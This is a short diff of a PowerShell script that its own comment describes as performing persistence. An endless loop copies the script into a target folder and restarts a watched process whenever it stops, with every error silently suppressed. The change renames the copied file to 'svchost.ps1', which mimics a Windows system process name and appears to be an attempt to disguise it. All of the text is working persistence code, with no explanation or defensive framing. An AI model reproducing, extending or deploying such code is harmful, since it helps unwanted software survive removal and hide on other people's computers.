@@ -14,6 +14,6 @@ $pathtest = Test-Path $path+"\powersistance.ps1" -ErrorAction SilentlyContinue
 #perofm persistance
 while(1 -eq 1){$open = Get-Process $persist -ErrorAction SilentlyContinue
 if($pathtest -eq $false){
-copy powersistance.ps1 $path -ErrorAction SilentlyContinue} 
+copy svchost.ps1 $path -ErrorAction SilentlyContinue} 
 if ($open -eq $null){start $persist}  
 } 
